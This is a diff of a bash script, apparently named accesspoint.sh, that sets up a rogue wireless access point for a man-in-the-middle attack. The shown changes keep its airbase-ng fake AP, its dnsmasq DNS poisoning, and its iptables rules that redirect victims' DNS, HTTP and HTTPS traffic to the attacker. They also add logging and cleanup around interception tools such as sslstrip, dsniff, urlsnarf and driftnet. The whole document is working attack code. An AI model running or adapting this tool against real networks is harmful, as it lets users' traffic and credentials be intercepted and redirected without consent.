@@ -5,7 +5,7 @@
 ####################
 # GLOBAL VARIABLES #
 ####################
-REVISION=045
+REVISION=046
 function todo(){
 echo "TODO LIST FOR NEWER REVISIONS"
 echo "- Fix For Ping Victim"
@@ -26,13 +26,16 @@ DHCPE=192.168.255.254      #dhcp end range
 BROADCAST=192.168.255.255  #broadcast address
 # Hosts/Net 65534          #CLASS C, Private Internet
 DHCPL=1h                   #time for dhcp lease
-folder=`pwd`/SESSION_$RANDOM
-sslstrip=`which sslstrip`
 ######################
 # END CONFIG SECTION #
 ######################
-function automode(){
+folder=`pwd`/SESSION_$RANDOM
+LOG=$folder/accesspoint.log
 mkdir $folder
+touch $LOG
+touch $folder/missing.log
+######################
+function automode(){
 monitormodestop
 mode=1
 verbose=0
@@ -44,7 +47,7 @@ PPS=100
 BEAINT=50
 WIFILIST=
 OTHEROPTS=
-MAC=$(ifconfig $ATHIFACE | awk '/HWaddr/ { print $5 }')
+MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
 SPOOFMAC=
 DHCPSERVER=1
 DNSURL=#
@@ -58,20 +61,19 @@ echo "CTRL+C Was Pressed..."
 echo ""
 stopshit
 monitormodestop
-kill `cat $folder/probe.pid` &>/dev/null
-kill `cat $folder/pwned.pid` &>/dev/null
-kill `cat $folder/web.pid` &>/dev/null
 cleanup
 exit 0
 }
 trap control_c SIGINT
 function cleanup(){
+mv $LOG $HOME/accesspoint.log
 rm -rf $folder
 mv $APACHECONF/default~ $APACHECONF/default
 dhcpconf=/etc/dhcp3/dhcpd.conf
 echo > $dhcpconf
 echo > /etc/dnsmasq.conf
 mv /etc/resolv.conf~ /etc/resolv.conf
+echo "Log File: $HOME/accesspoint.log"
 }
 function pinginternet(){
 echo "Pinging Google [8.8.8.8] with 64 bytes of data:"
@@ -125,12 +127,19 @@ update
 fi
 }
 function stopshit(){
-service apache2 stop &>/dev/null
-service dhcp3-server stop &>/dev/null
-service dnsmasq stop &>/dev/null
-service network-manager stop &>/dev/null
-killall -9 aircrack-ng airodump-ng aireplay-ng airbase-ng wireshark mdk3 dnsmasq driftnet urlsnarf dsniff &>/dev/null
-killall -9 dhclient dhclient3 NetworkManager wpa_supplicant &>/dev/null
+service apache2 stop &>$LOG
+service dhcp3-server stop &>$LOG
+service dnsmasq stop &>$LOG
+service network-manager stop &>$LOG
+for pid in `ls $folder/*.pid 2>$LOG`; do if [ -s "$pid" ]; then 
+kill `cat $folder/airbase-ng.pid 2>$LOG` &>/dev/null
+kill `cat $folder/probe.pid 2>$LOG` &>/dev/null
+kill `cat $folder/pwned.pid 2>$LOG` &>/dev/null
+kill `cat $folder/web.pid 2>$LOG` &>/dev/null
+kill `cat $pid 2>$LOG` &>/dev/null
+fi; done
+kill `cat /var/run/dhcpd/at0.pid 2>$LOG` &>/dev/null
+killall -9 airodump-ng aireplay-ng wireshark mdk3 driftnet urlsnarf dsniff &>/dev/null
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
@@ -175,6 +184,7 @@ gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
 function dnsmasqserver(){
 echo "address=/$DNSURL/$at0IP" > /etc/dnsmasq.conf
 echo "dhcp-authoritative" >> /etc/dnsmasq.conf
+echo "dhcp-lease-max=102" >> /etc/dnsmasq.conf
 echo "domain-needed" >> /etc/dnsmasq.conf
 echo "domain=wirelesslan" >> /etc/dnsmasq.conf
 echo "server=/wirelesslan/" >> /etc/dnsmasq.conf
@@ -275,7 +285,6 @@ echo ""
 if [ "$mode" = "" ]; then clear; poisonmenu; fi
 if [ "$mode" = "U" ]; then update; fi
 if [ "$mode" = "Q" ]; then echo "QUITER!!!!!!!!!!!!!"; sleep 5; exit 0; fi
-mkdir $folder
 }
 function verbosemenu(){
 echo "+===================================+"
@@ -330,7 +339,7 @@ echo "| DNSMASQ DNS POISON!!!             |"
 gnome-terminal --geometry=133x35 --hide-menubar --title=DNSERVER -e "dnsmasq --no-daemon -C /etc/dnsmasq.conf"
 }
 function startdnsmasqresolv(){
-echo "dhcp-option=lan,6,$at0IP,8.8.8.8" >> /etc/dnsmasq.conf
+echo "dhcp-option=wirelesslan,6,$at0IP,8.8.8.8" >> /etc/dnsmasq.conf
 echo "| DNSMASQ With Internet             |"
 gnome-terminal --geometry=134x35 --hide-menubar --title=DNSERVER -e \
 "dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
@@ -662,46 +671,32 @@ echo ""
 echo "+===================================+"
 echo "| Dependency Check                  |"
 echo "+===================================+"
-mydns="`which dnsmasq 2> /dev/null`"; if [ "$mydns" != "" ]; then
-echo "| [$OK] $mydns"
+# Are we root?
+if [ $UID -eq 0 ]; then echo "We are root: `date`" >> $LOG
 else
-echo "| [$FAIL] /usr/sbin/dnsmasq"
-echo "|"
-echo "| Attempting To apt-get install DNSMASQ"
-echo "|"
-read -e -p "Please Connect To The Internet Now And Press Enter" enter
-apt-get install dnsmasq -y -q
-echo "| Done"
+echo "| [$FAIL] Please Run This Script As Root or With Sudo!";
+echo "";
+exit 0; fi
+type -P dnsmasq &>/dev/null || { echo "| [$FAIL] dnsmasq"; echo "dnsmasq" >> $folder/missing.log;}
+if [ "$mydistro" = "BackTrack" ]; then
+type -P dhcpd3 &>/dev/null || { echo "| [$FAIL] dhcpd3"; echo "dhcpd3" >> $folder/missing.log;}
 fi
-if [ "$mydistro" = "BackTrack" ]; then mydhcpd="`which dhcpd3 2> /dev/null`"; fi 
-if [ "$mydistro" != "BackTrack" ]; then mydhcpd="`which dhcpd 2> /dev/null`"; fi
-if [ "$mydhcpd" != "" ]; then echo "| [$OK] $mydhcpd";
-else
-echo "| [$FAIL] /usr/sbin/dhcpd3"
-echo "|"
-echo "| Attempting To apt-get install DHCPD3"
-echo "|"
-read -e -p "Please Connect To The Internet Now And Press Enter" enter
-apt-get install dhcp3-server -y -q
-apt-get install dhcp3-common -y -q
-echo "| Done"
-echo "|"
+if [ "$mydistro" != "BackTrack" ]; then
+type -P dhcpd &>/dev/null || { echo "| [$FAIL] dhcpd"; echo "dhcpd" >> $folder/missing.log;}
 fi
-type -P dnsmasq &>/dev/null || { echo "| [$FAIL] dnsmasq";} 
-type -P dhcpd3 &>/dev/null || { echo "| [$FAIL] dhcpd3";}
-type -P aircrack-ng &>/dev/null || { echo "| [$FAIL] aircrack-ng";}
-type -P airdrop-ng &>/dev/null || { echo "| [$FAIL] airdrop-ng";}
-type -P xterm &>/dev/null || { echo "| [$FAIL] xterm";}
-type -P iptables &>/dev/null || { echo "| [$FAIL] iptables";}
-type -P ettercap &>/dev/null || { echo "| [$FAIL] ettercap";}
-type -P arpspoof &>/dev/null || { echo "| [$FAIL] arpspoof";}
-type -P sslstrip &>/dev/null || { echo "| [$FAIL] sslstrip";}
-type -P driftnet &>/dev/null || { echo "| [$FAIL] driftnet";}
-type -P urlsnarf &>/dev/null || { echo "| [$FAIL] urlsnarf";}
-type -P dsniff &>/dev/null || { echo "| [$FAIL] dsniff";}
-type -P python &>/dev/null || { echo "| [$FAIL] python";}
-type -P macchanger &>/dev/null || { echo "| [$FAIL] macchanger";}
-type -P msfconsole &>/dev/null || { echo "| [$FAIL] metasploit";}
+type -P aircrack-ng &>/dev/null || { echo "| [$FAIL] aircrack-ng"; echo "aircrack-ng" >> $folder/missing.log;}
+type -P airdrop-ng &>/dev/null || { echo "| [$FAIL] airdrop-ng"; echo "airdrop-ng" >> $folder/missing.log;}
+type -P xterm &>/dev/null || { echo "| [$FAIL] xterm"; echo "xterm" >> $folder/missing.log;}
+type -P iptables &>/dev/null || { echo "| [$FAIL] iptables"; echo "iptables" >> $folder/missing.log;}
+type -P ettercap &>/dev/null || { echo "| [$FAIL] ettercap"; echo "ettercap" >> $folder/missing.log;}
+type -P arpspoof &>/dev/null || { echo "| [$FAIL] arpspoof"; echo "arpspoof" >> $folder/missing.log;}
+type -P sslstrip &>/dev/null || { echo "| [$FAIL] sslstrip"; echo "sslstrip" >> $folder/missing.log;}
+type -P driftnet &>/dev/null || { echo "| [$FAIL] driftnet"; echo "driftnet" >> $folder/missing.log;}
+type -P urlsnarf &>/dev/null || { echo "| [$FAIL] urlsnarf"; echo "urlsnarf" >> $folder/missing.log;}
+type -P dsniff &>/dev/null || { echo "| [$FAIL] dsniff"; echo "dsniff" >> $folder/missing.log;}
+type -P python &>/dev/null || { echo "| [$FAIL] python"; echo "python" >> $folder/missing.log;}
+type -P macchanger &>/dev/null || { echo "| [$FAIL] macchanger"; echo "macchanger" >> $folder/missing.log;}
+type -P msfconsole &>/dev/null || { echo "| [$FAIL] metasploit"; echo "metasploit" >> $folder/missing.log;}
 # apt-get install python-dev
 echo "+===================================+"
 stopshit
@@ -768,6 +763,7 @@ echo "+===================================+"
 airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
 #airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 120 -v > $folder/airbaseng.log &
 sleep 4
+ps aux | awk '/[a]irbase-ng/ { print $2 }' > $folder/airbase-ng.pid
 ifconfig at0 up
 ifconfig at0 $at0IP netmask $NETMASK
 ifconfig at0 mtu $MTU
@@ -780,7 +776,6 @@ if [ "$DHCPSERVER" = "3" ]; then udhcpdserver; fi
 if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
 echo "+===================================+"
 if [ "$mode" = "1" ]; then
-service apache2 stop > /dev/null
 ERRORFILE=$(awk '/index/ { print $1 }' < <(ls /var/www))
 if [ "$ERRORFILE" = "" ]; then ERRORFILE=index.php; fi
 echo "ErrorDocument 404 /$ERRORFILE" > /etc/apache2/conf.d/localized-error-pages
@@ -789,8 +784,8 @@ echo > /var/log/apache2/error.log
 APACHECONF=/etc/apache2/sites-available
 if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
 else cp $APACHECONF/default $APACHECONF/default~; fi
-replace ${APACHE_LOG_DIR} $folder/ -- $APACHECONF/default &>/dev/null
-replace /var/log/apache2/ $folder/ -- $APACHECONF/default &>/dev/null
+replace ${APACHE_LOG_DIR} $folder/ -- $APACHECONF/default &>$LOG
+replace /var/log/apache2/ $folder/ -- $APACHECONF/default &>$LOG
 service apache2 start > /dev/null
 firewall
 iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP:53
@@ -802,11 +797,9 @@ iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP:
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $at0IP:80
 iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $at0IP:443
 cp /etc/resolv.conf /etc/resolv.conf~
-chmod a+w /etc/resolv.conf
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
 echo "nameserver $GATEWAY" >> /etc/resolv.conf
 echo "nameserver $at0IP" >> /etc/resolv.conf
-chmod a-w /etc/resolv.conf
 echo "+===================================+"
 echo "| APACHE2 WEB SERVER!!!             |"
 echo "+===================================+"
@@ -817,6 +810,8 @@ iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $at0IP
+iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $at0IP
+iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $at0IP
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
 iptables -t nat -A PREROUTING -p tcp -j DNAT --to $GW
 iptables -t nat -A PREROUTING -p udp -j DNAT --to $GW
@@ -839,13 +834,7 @@ echo ""
 echo "ATEMPTING TO END ATTACK..."
 stopshit
 monitormodestop
-kill `cat $folder/probe.pid`
-kill `cat $folder/pwned.pid`
-kill `cat $folder/web.pid`
 cleanup
-if [ "$DHCPSERVER" = "1" ]; then killall -9 dnsmasq; fi
-if [ "$DHCPSERVER" = "2" ]; then kill `cat /var/run/dhcpd/at0.pid`; fi
-if [ "$DHCPSERVER" = "3" ]; then killall -9 udhcpd; fi
 #firefox http://www.hackerbusters.ca/
 read -e -p "DONE THANKS FOR PLAYING YOU MAY NOW CLOSE THIS WINDOW "
 fi
